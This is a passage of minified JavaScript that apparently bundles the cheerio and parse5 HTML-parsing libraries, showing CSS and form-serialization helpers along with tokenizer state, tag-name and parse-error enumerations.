s[t]:r!=null&&(s[t]=r),e.attribs.style=Hp(s)}else if(typeof t=="object"){const s=Object.keys(t);for(let r=0;r<s.length;r++){const o=s[r];Ya(e,o,t[o],r)}}}function Ka(e,t){if(!e||!C(e))return;const n=Ip(e.attribs.style);if(typeof t=="string")return n[t];if(Array.isArray(t)){const a={};for(const s of t)n[s]!=null&&(a[s]=n[s]);return a}return n}function Hp(e){return Object.keys(e).reduce((t,n)=>`${t}${t?" ":""}${n}: ${e[n]};`,"")}function Ip(e){if(e=(e||"").trim(),!e)return{};const t={};let n;for(const a of e.split(";")){const s=a.indexOf(":");if(s<1||s===a.length-1){const r=a.trimEnd();r.length>0&&n!==void 0&&(t[n]+=`;${r}`)}else n=a.slice(0,s).trim(),t[n]=a.slice(s+1).trim()}return t}const jp=Object.freeze(Object.defineProperty({__proto__:null,css:Dp},Symbol.toStringTag,{value:"Module"})),Fn="input,select,textarea,keygen",Up=/%20/g,Vn=/\r?\n/g;function Jp(){return this.serializeArray().map(n=>`${encodeURIComponent(n.name)}=${encodeURIComponent(n.value)}`).join("&").replace(Up,"+")}function Bp(){return this.map((e,t)=>{const n=this._make(t);return C(t)&&t.name==="form"?n.find(Fn).toArray():n.filter(Fn).toArray()}).filter('[name!=""]:enabled:not(:submit, :button, :image, :reset, :file):matches([checked], :not(:checkbox, :radio))').map((e,t)=>{var n;const a=this._make(t),s=a.attr("name"),r=(n=a.val())!==null&&n!==void 0?n:"";return Array.isArray(r)?r.map(o=>({name:s,value:o.replace(Vn,`\r
`)})):{name:s,value:r.replace(Vn,`\r
`)}}).toArray()}const Fp=Object.freeze(Object.defineProperty({__proto__:null,serialize:Jp,serializeArray:Bp},Symbol.toStringTag,{value:"Module"}));function Vp(e){var t;return typeof e=="string"?{selector:e,value:"textContent"}:{selector:e.selector,value:(t=e.value)!==null&&t!==void 0?t:"textContent"}}function qp(e){const t={};for(const n in e){const a=e[n],s=Array.isArray(a),{selector:r,value:o}=Vp(s?a[0]:a),p=typeof o=="function"?o:typeof o=="string"?l=>this._make(l).prop(o):l=>this._make(l).extract(o);if(s)t[n]=this._findBySelector(r,Number.POSITIVE_INFINITY).map((l,i)=>p(i,n,t)).get();else{const l=this._findBySelector(r,1);t[n]=l.length>0?p(l[0],n,t):void 0}}return t}const zp=Object.freeze(Object.defineProperty({__proto__:null,extract:qp},Symbol.toStringTag,{value:"Module"}));class Tt{constructor(t,n,a){if(this.length=0,this.options=a,this._root=n,t){for(let s=0;s<t.length;s++)this[s]=t[s];this.length=t.length}}}Tt.prototype.cheerio="[cheerio object]";Tt.prototype.splice=Array.prototype.splice;Tt.prototype[Symbol.iterator]=Array.prototype[Symbol.iterator];Object.assign(Tt.prototype,Zr,wp,Lp,jp,Fp,zp);var qn;(function(e){e[e.EOF=-1]="EOF",e[e.NULL=0]="NULL",e[e.TABULATION=9]="TABULATION",e[e.CARRIAGE_RETURN=13]="CARRIAGE_RETURN",e[e.LINE_FEED=10]="LINE_FEED",e[e.FORM_FEED=12]="FORM_FEED",e[e.SPACE=32]="SPACE",e[e.EXCLAMATION_MARK=33]="EXCLAMATION_MARK",e[e.QUOTATION_MARK=34]="QUOTATION_MARK",e[e.AMPERSAND=38]="AMPERSAND",e[e.APOSTROPHE=39]="APOSTROPHE",e[e.HYPHEN_MINUS=45]="HYPHEN_MINUS",e[e.SOLIDUS=47]="SOLIDUS",e[e.DIGIT_0=48]="DIGIT_0",e[e.DIGIT_9=57]="DIGIT_9",e[e.SEMICOLON=59]="SEMICOLON",e[e.LESS_THAN_SIGN=60]="LESS_THAN_SIGN",e[e.EQUALS_SIGN=61]="EQUALS_SIGN",e[e.GREATER_THAN_SIGN=62]="GREATER_THAN_SIGN",e[e.QUESTION_MARK=63]="QUESTION_MARK",e[e.LATIN_CAPITAL_A=65]="LATIN_CAPITAL_A",e[e.LATIN_CAPITAL_Z=90]="LATIN_CAPITAL_Z",e[e.RIGHT_SQUARE_BRACKET=93]="RIGHT_SQUARE_BRACKET",e[e.GRAVE_ACCENT=96]="GRAVE_ACCENT",e[e.LATIN_SMALL_A=97]="LATIN_SMALL_A",e[e.LATIN_SMALL_Z=122]="LATIN_SMALL_Z"})(qn||(qn={}));var zn;(function(e){e.controlCharacterInInputStream="control-character-in-input-stream",e.noncharacterInInputStream="noncharacter-in-input-stream",e.surrogateInInputStream="surrogate-in-input-stream",e.nonVoidHtmlElementStartTagWithTrailingSolidus="non-void-html-element-start-tag-with-trailing-solidus",e.endTagWithAttributes="end-tag-with-attributes",e.endTagWithTrailingSolidus="end-tag-with-trailing-solidus",e.unexpectedSolidusInTag="unexpected-solidus-in-tag",e.unexpectedNullCharacter="unexpected-null-character",e.unexpectedQuestionMarkInsteadOfTagName="unexpected-question-mark-instead-of-tag-name",e.invalidFirstCharacterOfTagName="invalid-first-character-of-tag-name",e.unexpectedEqualsSignBeforeAttributeName="unexpected-equals-sign-before-attribute-name",e.missingEndTagName="missing-end-tag-name",e.unexpectedCharacterInAttributeName="unexpected-character-in-attribute-name",e.unknownNamedCharacterReference="unknown-named-character-reference",e.missingSemicolonAfterCharacterReference="missing-semicolon-after-character-reference",e.unexpectedCharacterAfterDoctypeSystemIdentifier="unexpected-character-after-doctype-system-identifier",e.unexpectedCharacterInUnquotedAttributeValue="unexpected-character-in-unquoted-attribute-value",e.eofBeforeTagName="eof-before-tag-name",e.eofInTag="eof-in-tag",e.missingAttributeValue="missing-attribute-value",e.missingWhitespaceBetweenAttributes="missing-whitespace-between-attributes",e.missingWhitespaceAfterDoctypePublicKeyword="missing-whitespace-after-doctype-public-keyword",e.missingWhitespaceBetweenDoctypePublicAndSystemIdentifiers="missing-whitespace-between-doctype-public-and-system-identifiers",e.missingWhitespaceAfterDoctypeSystemKeyword="missing-whitespace-after-doctype-system-keyword",e.missingQuoteBeforeDoctypePublicIdentifier="missing-quote-before-doctype-public-identifier",e.missingQuoteBeforeDoctypeSystemIdentifier="missing-quote-before-doctype-system-identifier",e.missingDoctypePublicIdentifier="missing-doctype-public-identifier",e.missingDoctypeSystemIdentifier="missing-doctype-system-identifier",e.abruptDoctypePublicIdentifier="abrupt-doctype-public-identifier",e.abruptDoctypeSystemIdentifier="abrupt-doctype-system-identifier",e.cdataInHtmlContent="cdata-in-html-content",e.incorrectlyOpenedComment="incorrectly-opened-comment",e.eofInScriptHtmlCommentLikeText="eof-in-script-html-comment-like-text",e.eofInDoctype="eof-in-doctype",e.nestedComment="nested-comment",e.abruptClosingOfEmptyComment="abrupt-closing-of-empty-comment",e.eofInComment="eof-in-comment",e.incorrectlyClosedComment="incorrectly-closed-comment",e.eofInCdata="eof-in-cdata",e.absenceOfDigitsInNumericCharacterReference="absence-of-digits-in-numeric-character-reference",e.nullCharacterReference="null-character-reference",e.surrogateCharacterReference="surrogate-character-reference",e.characterReferenceOutsideUnicodeRange="character-reference-outside-unicode-range",e.controlCharacterReference="control-character-reference",e.noncharacterCharacterReference="noncharacter-character-reference",e.missingWhitespaceBeforeDoctypeName="missing-whitespace-before-doctype-name",e.missingDoctypeName="missing-doctype-name",e.invalidCharacterSequenceAfterDoctypeName="invalid-character-sequence-after-doctype-name",e.duplicateAttribute="duplicate-attribute",e.nonConformingDoctype="non-conforming-doctype",e.missingDoctype="missing-doctype",e.misplacedDoctype="misplaced-doctype",e.endTagWithoutMatchingOpenElement="end-tag-without-matching-open-element",e.closingOfElementWithOpenChildElements="closing-of-element-with-open-child-elements",e.disallowedContentInNoscriptInHead="disallowed-content-in-noscript-in-head",e.openElementsLeftAfterEof="open-elements-left-after-eof",e.abandonedHeadElementChild="abandoned-head-element-child",e.misplacedStartTagForHeadElement="misplaced-start-tag-for-head-element",e.nestedNoscriptInHead="nested-noscript-in-head",e.eofInElementThatCanContainOnlyText="eof-in-element-that-can-contain-only-text"})(zn||(zn={}));var $n;(function(e){e[e.CHARACTER=0]="CHARACTER",e[e.NULL_CHARACTER=1]="NULL_CHARACTER",e[e.WHITESPACE_CHARACTER=2]="WHITESPACE_CHARACTER",e[e.START_TAG=3]="START_TAG",e[e.END_TAG=4]="END_TAG",e[e.COMMENT=5]="COMMENT",e[e.DOCTYPE=6]="DOCTYPE",e[e.EOF=7]="EOF",e[e.HIBERNATION=8]="HIBERNATION"})($n||($n={}));var U;(function(e){e.HTML="http://www.w3.org/1999/xhtml",e.MATHML="http://www.w3.org/1998/Math/MathML",e.SVG="http://www.w3.org/2000/svg",e.XLINK="http://www.w3.org/1999/xlink",e.XML="http://www.w3.org/XML/1998/namespace",e.XMLNS="http://www.w3.org/2000/xmlns/"})(U||(U={}));var Xn;(function(e){e.TYPE="type",e.ACTION="action",e.ENCODING="encoding",e.PROMPT="prompt",e.NAME="name",e.COLOR="color",e.FACE="face",e.SIZE="size"})(Xn||(Xn={}));var Gn;(function(e){e.NO_QUIRKS="no-quirks",e.QUIRKS="quirks",e.LIMITED_QUIRKS="limited-quirks"})(Gn||(Gn={}));var x;(function(e){e.A="a",e.ADDRESS="address",e.ANNOTATION_XML="annotation-xml",e.APPLET="applet",e.AREA="area",e.ARTICLE="article",e.ASIDE="aside",e.B="b",e.BASE="base",e.BASEFONT="basefont",e.BGSOUND="bgsound",e.BIG="big",e.BLOCKQUOTE="blockquote",e.BODY="body",e.BR="br",e.BUTTON="button",e.CAPTION="caption",e.CENTER="center",e.CODE="code",e.COL="col",e.COLGROUP="colgroup",e.DD="dd",e.DESC="desc",e.DETAILS="details",e.DIALOG="dialog",e.DIR="dir",e.DIV="div",e.DL="dl",e.DT="dt",e.EM="em",e.EMBED="embed",e.FIELDSET="fieldset",e.FIGCAPTION="figcaption",e.FIGURE="figure",e.FONT="font",e.FOOTER="footer",e.FOREIGN_OBJECT="foreignObject",e.FORM="form",e.FRAME="frame",e.FRAMESET="frameset",e.H1="h1",e.H2="h2",e.H3="h3",e.H4="h4",e.H5="h5",e.H6="h6",e.HEAD="head",e.HEADER="header",e.HGROUP="hgroup",e.HR="hr",e.HTML="html",e.I="i",e.IMG="img",e.IMAGE="image",e.INPUT="input",e.IFRAME="iframe",e.KEYGEN="keygen",e.LABEL="label",e.LI="li",e.LINK="link",e.LISTING="listing",e.MAIN="main",e.MALIGNMARK="malignmark",e.MARQUEE="marquee",e.MATH="math",e.MENU="menu",e.META="meta",e.MGLYPH="mglyph",e.MI="mi",e.MO="mo",e.MN="mn",e.MS="ms",e.MTEXT="mtext",e.NAV="nav",e.NOBR="nobr",e.NOFRAMES="noframes",e.NOEMBED="noembed",e.NOSCRIPT="noscript",e.OBJECT="object",e.OL="ol",e.OPTGROUP="optgroup",e.OPTION="option",e.P="p",e.PARAM="param",e.PLAINTEXT="plaintext",e.PRE="pre",e.RB="rb",e.RP="rp",e.RT="rt",e.RTC="rtc",e.RUBY="ruby",e.S="s",e.SCRIPT="script",e.SEARCH="search",e.SECTION="section",e.SELECT="select",e.SOURCE="source",e.SMALL="small",e.SPAN="span",e.STRIKE="strike",e.STRONG="strong",e.STYLE="style",e.SUB="sub",e.SUMMARY="summary",e.SUP="sup",e.TABLE="table",e.TBODY="tbody",e.TEMPLATE="template",e.TEXTAREA="textarea",e.TFOOT="tfoot",e.TD="td",e.TH="th",e.THEAD="thead",e.TITLE="title",e.TR="tr",e.TRACK="track",e.TT="tt",e.U="u",e.UL="ul",e.SVG="svg",e.VAR="var",e.WBR="wbr",e.XMP="xmp"})(x||(x={}));var c;(function(e){e[e.UNKNOWN=0]="UNKNOWN",e[e.A=1]="A",e[e.ADDRESS=2]="ADDRESS",e[e.ANNOTATION_XML=3]="ANNOTATION_XML",e[e.APPLET=4]="APPLET",e[e.AREA=5]="AREA",e[e.ARTICLE=6]="ARTICLE",e[e.ASIDE=7]="ASIDE",e[e.B=8]="B",e[e.BASE=9]="BASE",e[e.BASEFONT=10]="BASEFONT",e[e.BGSOUND=11]="BGSOUND",e[e.BIG=12]="BIG",e[e.BLOCKQUOTE=13]="BLOCKQUOTE",e[e.BODY=14]="BODY",e[e.BR=15]="BR",e[e.BUTTON=16]="BUTTON",e[e.CAPTION=17]="CAPTION",e[e.CENTER=18]="CENTER",e[e.CODE=19]="CODE",e[e.COL=20]="COL",e[e.COLGROUP=21]="COLGROUP",e[e.DD=22]="DD",e[e.DESC=23]="DESC",e[e.DETAILS=24]="DETAILS",e[e.DIALOG=25]="DIALOG",e[e.DIR=26]="DIR",e[e.DIV=27]="DIV",e[e.DL=28]="DL",e[e.DT=29]="DT",e[e.EM=30]="EM",e[e.EMBED=31]="EMBED",e[e.FIELDSET=32]="FIELDSET",e[e.FIGCAPTION=33]="FIGCAPTION",e[e.FIGURE=34]="FIGURE",e[e.FONT=35]="FONT",e[e.FOOTER=36]="FOOTER",e[e.FOREIGN_OBJECT=37]="FOREIGN_OBJECT",e[e.FORM=38]="FORM",e[e.FRAME=39]="FRAME",e[e.FRAMESET=40]="FRAMESET",e[e.H1=41]="H1",e[e.H2=42]="H2",e[e.H3=43]="H3",e[e.H4=44]="H4",e[e.H5=45]="H5",e[e.H6=46]="H6",e[e.HEAD=47]="HEAD",e[e.HEADER=48]="HEADER",e[e.HGROUP=49]="HGROUP",e[e.HR=50]="HR",e[e.HTML=51]="HTML",e[e.I=52]="I",e[e.IMG=53]="IMG",e[e.IMAGE=54]="IMAGE",e[e.INPUT=55]="INPUT",e[e.IFRAME=56]="IFRAME",e[e.KEYGEN=57]="KEYGEN",e[e.LABEL=58]="LABEL",e[e.LI=59]="LI",e[e.LINK=60]="LINK",e[e.LISTING=61]="LISTING",e[e.MAIN=62]="MAIN",e[e.MALIGNMARK=63]="MALIGNMARK",e[e.MARQUEE=64]="MARQUEE",e[e.MATH=65]="MATH",e[e.MENU=66]="MENU",e[e.META=67]="META",e[e.MGLYPH=68]="MGLYPH",e[e.MI=69]="MI",e[e.MO=70]="MO",e[e.MN=71]="MN",e[e.MS=72]="MS",e[e.MTEXT=73]="MTEXT",e[e.NAV=74]="NAV",e[e.NOBR=75]="NOBR",e[e.NOFRAMES=76]="NOFRAMES",e[e.NOEMBED=77]="NOEMBED",e[e.NOSCRIPT=78]="NOSCRIPT",e[e.OBJECT=79]="OBJECT",e[e.OL=80]="OL",e[e.OPTGROUP=81]="OPTGROUP",e[e.OPTION=82]="OPTION",e[e.P=83]="P",e[e.PARAM=84]="PARAM",e[e.PLAINTEXT=85]="PLAINTEXT",e[e.PRE=86]="PRE",e[e.RB=87]="RB",e[e.RP=88]="RP",e[e.RT=89]="RT",e[e.RTC=90]="RTC",e[e.RUBY=91]="RUBY",e[e.S=92]="S",e[e.SCRIPT=93]="SCRIPT",e[e.SEARCH=94]="SEARCH",e[e.SECTION=95]="SECTION",e[e.SELECT=96]="SELECT",e[e.SOURCE=97]="SOURCE",e[e.SMALL=98]="SMALL",e[e.SPAN=99]="SPAN",e[e.STRIKE=100]="STRIKE",e[e.STRONG=101]="STRONG",e[e.STYLE=102]="STYLE",e[e.SUB=103]="SUB",e[e.SUMMARY=104]="SUMMARY",e[e.SUP=105]="SUP",e[e.TABLE=106]="TABLE",e[e.TBODY=107]="TBODY",e[e.TEMPLATE=108]="TEMPLATE",e[e.TEXTAREA=109]="TEXTAREA",e[e.TFOOT=110]="TFOOT",e[e.TD=111]="TD",e[e.TH=112]="TH",e[e.THEAD=113]="THEAD",e[e.TITLE=114]="TITLE",e[e.TR=115]="TR",e[e.TRACK=116]="TRACK",e[e.TT=117]="TT",e[e.U=118]="U",e[e.UL=119]="UL",e[e.SVG=120]="SVG",e[e.VAR=121]="VAR",e[e.WBR=122]="WBR",e[e.XMP=123]="XMP"})(c||(c={}));x.A,c.A,x.ADDRESS,c.ADDRESS,x.ANNOTATION_XML,c.ANNOTATION_XML,x.APPLET,c.APPLET,x.AREA,c.AREA,x.ARTICLE,c.ARTICLE,x.ASIDE,c.ASIDE,x.B,c.B,x.BASE,c.BASE,x.BASEFONT,c.BASEFONT,x.BGSOUND,c.BGSOUND,x.BIG,c.BIG,x.BLOCKQUOTE,c.BLOCKQUOTE,x.BODY,c.BODY,x.BR,c.BR,x.BUTTON,c.BUTTON,x.CAPTION,c.CAPTION,x.CENTER,c.CENTER,x.CODE,c.CODE,x.COL,c.COL,x.COLGROUP,c.COLGROUP,x.DD,c.DD,x.DESC,c.DESC,x.DETAILS,c.DETAILS,x.DIALOG,c.DIALOG,x.DIR,c.DIR,x.DIV,c.DIV,x.DL,c.DL,x.DT,c.DT,x.EM,c.EM,x.EMBED,c.EMBED,x.FIELDSET,c.FIELDSET,x.FIGCAPTION,c.FIGCAPTION,x.FIGURE,c.FIGURE,x.FONT,c.FONT,x.FOOTER,c.FOOTER,x.FOREIGN_OBJECT,c.FOREIGN_OBJECT,x.FORM,c.FORM,x.FRAME,c.FRAME,x.FRAMESET,c.FRAMESET,x.H1,c.H1,x.H2,c.H2,x.H3,c.H3,x.H4,c.H4,x.H5,c.H5,x.H6,c.H6,x.HEAD,c.HEAD,x.HEADER,c.HEADER,x.HGROUP,c.HGROUP,x.HR,c.HR,x.HTML,c.HTML,x.I,c.I,x.IMG,c.IMG,x.IMAGE,c.IMAGE,x.INPUT,c.INPUT,x.IFRAME,c.IFRAME,x.KEYGEN,c.KEYGEN,x.LABEL,c.LABEL,x.LI,c.LI,x.LINK,c.LINK,x.LISTING,c.LISTING,x.MAIN,c.MAIN,x.MALIGNMARK,c.MALIGNMARK,x.MARQUEE,c.MARQUEE,x.MATH,c.MATH,x.MENU,c.MENU,x.META,c.META,x.MGLYPH,c.MGLYPH,x.MI,c.MI,x.MO,c.MO,x.MN,c.MN,x.MS,c.MS,x.MTEXT,c.MTEXT,x.NAV,c.NAV,x.NOBR,c.NOBR,x.NOFRAMES,c.NOFRAMES,x.NOEMBED,c.NOEMBED,x.NOSCRIPT,c.NOSCRIPT,x.OBJECT,c.OBJECT,x.OL,c.OL,x.OPTGROUP,c.OPTGROUP,x.OPTION,c.OPTION,x.P,c.P,x.PARAM,c.PARAM,x.PLAINTEXT,c.PLAINTEXT,x.PRE,c.PRE,x.RB,c.RB,x.RP,c.RP,x.RT,c.RT,x.RTC,c.RTC,x.RUBY,c.RUBY,x.S,c.S,x.SCRIPT,c.SCRIPT,x.SEARCH,c.SEARCH,x.SECTION,c.SECTION,x.SELECT,c.SELECT,x.SOURCE,c.SOURCE,x.SMALL,c.SMALL,x.SPAN,c.SPAN,x.STRIKE,c.STRIKE,x.STRONG,c.STRONG,x.STYLE,c.STYLE,x.SUB,c.SUB,x.SUMMARY,c.SUMMARY,x.SUP,c.SUP,x.TABLE,c.TABLE,x.TBODY,c.TBODY,x.TEMPLATE,c.TEMPLATE,x.TEXTAREA,c.TEXTAREA,x.TFOOT,c.TFOOT,x.TD,c.TD,x.TH,c.TH,x.THEAD,c.THEAD,x.TITLE,c.TITLE,x.TR,c.TR,x.TRACK,c.TRACK,x.TT,c.TT,x.U,c.U,x.UL,c.UL,x.SVG,c.SVG,x.VAR,c.VAR,x.WBR,c.WBR,x.XMP,c.XMP;const w=c;U.HTML+"",w.ADDRESS,w.APPLET,w.AREA,w.ARTICLE,w.ASIDE,w.BASE,w.BASEFONT,w.BGSOUND,w.BLOCKQUOTE,w.BODY,w.BR,w.BUTTON,w.CAPTION,w.CENTER,w.COL,w.COLGROUP,w.DD,w.DETAILS,w.DIR,w.DIV,w.DL,w.DT,w.EMBED,w.FIELDSET,w.FIGCAPTION,w.FIGURE,w.FOOTER,w.FORM,w.FRAME,w.FRAMESET,w.H1,w.H2,w.H3,w.H4,w.H5,w.H6,w.HEAD,w.HEADER,w.HGROUP,w.HR,w.HTML,w.IFRAME,w.IMG,w.INPUT,w.LI,w.LINK,w.LISTING,w.MAIN,w.MARQUEE,w.MENU,w.META,w.NAV,w.NOEMBED,w.NOFRAMES,w.NOSCRIPT,w.OBJECT,w.OL,w.P,w.PARAM,w.PLAINTEXT,w.PRE,w.SCRIPT,w.SECTION,w.SELECT,w.SOURCE,w.STYLE,w.SUMMARY,w.TABLE,w.TBODY,w.TD,w.TEMPLATE,w.TEXTAREA,w.TFOOT,w.TH,w.THEAD,w.TITLE,w.TR,w.TRACK,w.UL,w.WBR,w.XMP,U.MATHML+"",w.MI,w.MO,w.MN,w.MS,w.MTEXT,w.ANNOTATION_XML,U.SVG+"",w.TITLE,w.FOREIGN_OBJECT,w.DESC,U.XLINK+"",U.XML+"",U.XMLNS+"";w.H1,w.H2,w.H3,w.H4,w.H5,w.H6;x.STYLE,x.SCRIPT,x.XMP,x.IFRAME,x.NOEMBED,x.NOFRAMES,x.PLAINTEXT;var ce;(function(e){e[e.DATA=0]="DATA",e[e.RCDATA=1]="RCDATA",e[e.RAWTEXT=2]="RAWTEXT",e[e.SCRIPT_DATA=3]="SCRIPT_DATA",e[e.PLAINTEXT=4]="PLAINTEXT",e[e.TAG_OPEN=5]="TAG_OPEN",e[e.END_TAG_OPEN=6]="END_TAG_OPEN",e[e.TAG_NAME=7]="TAG_NAME",e[e.RCDATA_LESS_THAN_SIGN=8]="RCDATA_LESS_THAN_SIGN",e[e.RCDATA_END_TAG_OPEN=9]="RCDATA_END_TAG_OPEN",e[e.RCDATA_END_TAG_NAME=10]="RCDATA_END_TAG_NAME",e[e.RAWTEXT_LESS_THAN_SIGN=11]="RAWTEXT_LESS_THAN_SIGN",e[e.RAWTEXT_END_TAG_OPEN=12]="RAWTEXT_END_TAG_OPEN",e[e.RAWTEXT_END_TAG_NAME=13]="RAWTEXT_END_TAG_NAME",e[e.SCRIPT_DATA_LESS_THAN_SIGN=14]="SCRIPT_DATA_LESS_THAN_SIGN",e[e.SCRIPT_DATA_END_TAG_OPEN=15]="SCRIPT_DATA_END_TAG_OPEN",e[e.SCRIPT_DATA_END_TAG_NAME=16]="SCRIPT_DATA_END_TAG_NAME",e[e.SCRIPT_DATA_ESCAPE_START=17]="SCRIPT_DATA_ESCAPE_START",e[e.SCRIPT_DATA_ESCAPE_START_DASH=18]="SCRIPT_DATA_ESCAPE_START_DASH",e[e.SCRIPT_DATA_ESCAPED=19]="SCRIPT_DATA_ESCAPED",e[e.SCRIPT_DATA_ESCAPED_DASH=20]="SCRIPT_DATA_ESCAPED_DASH",e[e.SCRIPT_DATA_ESCAPED_DASH_DASH=21]="SCRIPT_DATA_ESCAPED_DASH_DASH",e[e.SCRIPT_DATA_ESCAPED_LESS_THAN_SIGN=22]="SCRIPT_DATA_ESCAPED_LESS_THAN_SIGN",e[e.SCRIPT_DATA_ESCAPED_END_TAG_OPEN=23]="SCRIPT_DATA_ESCAPED_END_TAG_OPEN",e[e.SCRIPT_DATA_ESCAPED_END_TAG_NAME=24]="SCRIPT_DATA_ESCAPED_END_TAG_NAME",e[e.SCRIPT_DATA_DOUBLE_ESCAPE_START=25]="SCRIPT_DATA_DOUBLE_ESCAPE_START",e[e.SCRIPT_DATA_DOUBLE_ESCAPED=26]="SCRIPT_DATA_DOUBLE_ESCAPED",e[e.SCRIPT_DATA_DOUBLE_ESCAPED_DASH=27]="SCRIPT_DATA_DOUBLE_ESCAPED_DASH",e[e.SCRIPT_DATA_DOUBLE_ESCAPED_DASH_DASH=28]="SCRIPT_DATA_DOUBLE_ESCAPED_DASH_DASH",e[e.SCRIPT_DATA_DOUBLE_ESCAPED_LESS_THAN_SIGN=29]="SCRIPT_DATA_DOUBLE_ESCAPED_LESS_THAN_SIGN",e[e.SCRIPT_DATA_DOUBLE_ESCAPE_END=30]="SCRIPT_DATA_DOUBLE_ESCAPE_END",e[e.BEFORE_ATTRIBUTE_NAME=31]="BEFORE_ATTRIBUTE_NAME",e[e.ATTRIBUTE_NAME=32]="ATTRIBUTE_NAME",e[e.AFTER_ATTRIBUTE_NAME=33]="AFTER_ATTRIBUTE_NAME",e[e.BEFORE_ATTRIBUTE_VALUE=34]="BEFORE_ATTRIBUTE_VALUE",e[e.ATTRIBUTE_VALUE_DOUBLE_QUOTED=35]="ATTRIBUTE_VALUE_DOUBLE_QUOTED",e[e.ATTRIBUTE_VALUE_SINGLE_QUOTED=36]="ATTRIBUTE_VALUE_SINGLE_QUOTED",e[e.ATTRIBUTE_VALUE_UNQUOTED=37]="ATTRIBUTE_VALUE_UNQUOTED",e[e.AFTER_ATTRIBUTE_VALUE_QUOTED=38]="AFTER_ATTRIBUTE_VALUE_QUOTED",e[e.SELF_CLOSING_START_TAG=39]="SELF_CLOSING_START_TAG",e[e.BOGUS_COMMENT=40]="BOGUS_COMMENT",e[e.MARKUP_DECLARATION_OPEN=41]="MARKUP_DECLARATION_OPEN",e[e.COMMENT_START=42]="COMMENT_START",e[e.COMMENT_START_DASH=43]="COMMENT_START_DASH",e[e.COMMENT=44]="COMMENT",e[e.COMMENT_LESS_THAN_SIGN=45]="COMMENT_LESS_THAN_SIGN",e[e.COMMENT_LESS_THAN_SIGN_BANG=46]="COMMENT_LESS_THAN_SIGN_BANG",e[e.COMMENT_LESS_THAN_SIGN_BANG_DASH=47]="COMMENT_LESS_THAN_SIGN_BANG_DASH",e[e.COMMENT_LESS_THAN_SIGN_BANG_DASH_DASH=48]="COMMENT_LESS_THAN_SIGN_BANG_DASH_DASH",e[e.COMMENT_END_DASH=49]="COMMENT_END_DASH",e[e.COMMENT_END=50]="COMMENT_END",e[e.COMMENT_END_BANG=51]="COMMENT_END_BANG",e[e.DOCTYPE=52]="DOCTYPE",e[e.BEFORE_DOCTYPE_NAME=53]="BEFORE_DOCTYPE_NAME",e[e.DOCTYPE_NAME=54]="DOCTYPE_NAME",e[e.AFTER_DOCTYPE_NAME=55]="AFTER_DOCTYPE_NAME",e[e.AFTER_DOCTYPE_PUBLIC_KEYWORD=56]="AFTER_DOCTYPE_PUBLIC_KEYWORD",e[e.BEFORE_DOCTYPE_PUBLIC_IDENTIFIER=57]="BEFORE_DOCTYPE_PUBLIC_IDENTIFIER",e[e.DOCTYPE_PUBLIC_IDENTIFIER_DOUBLE_QUOTED=58]="DOCTYPE_PUBLIC_IDENTIFIER_DOUBLE_QUOTED",e[e.DOCTYPE_PUBLIC_IDENTIFIER_SINGLE_QUOTED=59]="DOCTYPE_PUBLIC_IDENTIFIER_SINGLE_QUOTED",e[e.AFTER_DOCTYPE_PUBLIC_IDENTIFIER=60]="AFTER_DOCTYPE_PUBLIC_IDENTIFIER",e[e.BETWEEN_DOCTYPE_PUBLIC_AND_SYSTEM_IDENTIFIERS=61]="BETWEEN_DOCTYPE_PUBLIC_AND_SYSTEM_IDENTIFIERS",e[e.AFTER_DOCTYPE_SYSTEM_KEYWORD=62]="AFTER_DOCTYPE_SYSTEM_KEYWORD",e[e.BEFORE_DOCTYPE_SYSTEM_IDENTIFIER=63]="BEFORE_DOCTYPE_SYSTEM_IDENTIFIER",e[e.DOCTYPE_SYSTEM_IDENTIFIER_DOUBLE_QUOTED=64]="DOCTYPE_SYSTEM_IDENTIFIER_DOUBLE_QUOTED",e[e.DOCTYPE_SYSTEM_IDENTIFIER_SINGLE_QUOTED=65]="DOCTYPE_SYSTEM_IDENTIFIER_SINGLE_QUOTED",e[e.AFTER_DOCTYPE_SYSTEM_IDENTIFIER=66]="AFTER_DOCTYPE_SYSTEM_IDENTIFIER",e[e.BOGUS_DOCTYPE=67]="BOGUS_DOCTYPE",e[e.CDATA_SECTION=68]="CDATA_SECTION",e[e.CDATA_SECTION_BRACKET=69]="CDATA_SECTION_BRACKET",e[e.CDATA_SECTION_END=70]="CDATA_SECTION_END",e[e.CHARACTER_REFERENCE=71]="CHARACTER_REFERENCE",e[e.AMBIGUOUS_AMPERSAND=72]="AMBIGUOUS_AMPERSAND"})(ce||(ce={}));ce.DATA,ce.RCDATA,ce.RAWTEXT,ce.SCRIPT_DATA,ce.PLAINTEXT,ce.CDATA_SECTION;const $p=new Set([c.DD,c.DT,c.LI,c.OPTGROUP,c.OPTION,c.P,c.RB,c.RP,c.RT,c.RTC]);[...$p,c.CAPTION,c.COLGROUP,c.TBODY,c.TD,c.TFOOT,c.TH,c.THEAD,c.TR];const Qa=new Set([c.APPLET,c.CAPTION,c.HTML,c.MARQUEE,c.OBJECT,c.TABLE,c.TD,c.TEMPLATE,c.TH]);[...Qa,c.OL,c.UL];[...Qa,c.BUTTON];c.ANNOTATION_XML,c.MI,c.MN,c.MO,c.MS,c.MTEXT;c.DESC,c.FOREIGN_OBJECT,c.TITLE;c.TR,c.TEMPLATE,c.HTML;c.TBODY,c.TFOOT,c.THEAD,c.TEMPLATE,c.HTML;c.TABLE,c.TEMPLATE,c.HTML;c.TD,c.TH;var Gt;(function(e){e[e.Marker=0]="Marker",e[e.Element=1]="Element"})(Gt||(Gt={}));Gt.Marker;new Map(["attributeName","attributeType","baseFrequency","baseProfile","calcMode","clipPathUnits","diffuseConstant","edgeMode","filterUnits","glyphRef","gradientTransform","gradientUnits","kernelMatrix","kernelUnitLength","keyPoints","keySplines","keyTimes","lengthAdjust","limitingConeAngle","markerHeight","markerUnits","markerWidth","maskContentUnits","maskUnits","numOctaves","pathLength","patternContentUnits","patternTransform","patternUnits","pointsAtX","pointsAtY","pointsAtZ","preserveAlpha","preserveAspectRatio","primitiveUnits","refX","refY","repeatCount","repeatDur","requiredExtensions","requiredFeatures","specularConstant","specularExponent","spreadMethod","startOffset","stdDeviation","stitchTiles","surfaceScale","systemLanguage","tableValues","targetX","targetY","textLength","viewBox","viewTarget","xChannelSelector","yChannelSelector","zoomAndPan"].map(e=>[e.toLowerCase(),e]));U.XLINK,U.XLINK,U.XLINK,U.XLINK,U.XLINK,U.XLINK,U.XLINK,U.XML,U.XML,U.XMLNS,U.XMLNS;new 